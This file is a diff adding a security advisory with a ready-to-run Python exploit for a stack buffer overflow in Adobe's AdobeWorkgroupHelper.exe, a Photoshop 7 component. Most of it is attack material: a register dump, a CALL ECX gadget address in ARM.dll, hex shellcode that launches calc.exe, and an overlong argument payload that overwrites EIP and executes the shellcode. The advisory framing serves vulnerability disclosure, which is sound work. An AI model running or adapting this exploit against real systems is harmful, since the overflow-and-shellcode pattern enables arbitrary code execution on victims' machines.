@@ -1,0 +1,147 @@
+'''
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-ADOBE-WRKGRP-BUFFER-OVERFLOW.txt
+
+
+Vendor:
+================================
+www.adobe.com
+
+
+Product:
+=================================
+AdobeWorkgroupHelper.exe v2.8.3.3
+Part of Photoshop 7.0 circa 2002
+
+
+Vulnerability Type:
+===========================
+Stack Based Buffer Overflow
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+AdobeWorkgroupHelper.exe is a component of the Photoshop 7 workgroup
+functionality, that lets users work with files on a server that is
+registered as a workgroup.
+If AdobeWorkgroupHelper.exe is called with an overly long command line
+argument it is vulnerable to a stack based buffer overflow exploit.
+
+Resluting in arbitrary code execution undermining the integrity of the
+program. We can control EIP register at about 5,856 bytes, our shellcode
+will point
+to ECX register.
+
+Tested successfully on Windows 7 SP1
+
+
+Exploit code(s):
+===============
+
+Use below python script to exploit...
+'''
+
+import struct,os,subprocess
+
+#Photoshop 7 AdobeWorkgroupHelper.exe buffer overflow exploit
+#Tested Windows 7 SP1
+#------------------------------------
+#by hyp3rlinx - apparitionsec@gmail.com
+#hyp3rlinx.altervista.org
+#==============================================================
+#
+#0x618b19f7 : call ecx |  {PAGE_EXECUTE_READ} [ARM.dll]
+#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.8.3.3
+#(C:\Program Files (x86)\Common Files\Adobe\Workflow\ARM.dll)
+#===============================================================
+
+'''
+Quick Register dump...
+
+EAX 00270938
+ECX 00270A7C                     <---------------BOOM!
+EDX 00A515FC ASCII "AAAAAA..."
+EBX 41414140
+ESP 0018FEB0
+EBP 0018FED0
+ESI 00000000
+EDI 41414141
+EIP 004585C8 AdobeWor.004585C8
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 0  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 0  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
+
+'''
+
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+vulnpgm="C:\Program Files (x86)\Common
+Files\Adobe\Workflow\AdobeWorkgroupHelper.exe "
+
+#payload="A"*5852+"R"*4  #<---- control EIP register
+
+#our shellcode will point at ECX register, so we need to find an JMP or
+CALL ECX and point EIP to that address
+#where our malicious code resides, we find it in ARM.dll
+
+eip=struct.pack('<L', 0x618B19F7)    #CALL ECX ARM.dll v2.8.3.3
+payload="A"*5852+eip+"\x90"*20+sc    #<----- direct EIP overwrite BOOOOOM!!!
+
+subprocess.Popen([vulnpgm, payload], shell=False)
+
+
+'''
+Disclosure Timeline:
+=========================================================
+Vendor Notification: August 31, 2015
+October 12, 2015  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+=========================================================
+Med
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
+'''
